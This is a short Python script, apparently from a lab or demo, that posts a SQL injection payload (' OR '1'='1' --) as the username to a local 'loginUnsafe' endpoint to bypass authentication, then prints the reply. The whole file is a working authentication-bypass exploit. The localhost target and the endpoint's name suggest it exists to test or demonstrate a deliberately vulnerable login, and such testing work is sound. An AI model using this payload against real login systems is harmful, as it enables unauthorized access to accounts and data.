import requests
res=requests.post('http://localhost:8090/api/auth/loginUnsafe', json={'username': "' OR '1'='1' -- ", 'password': '1'})
print(res.text)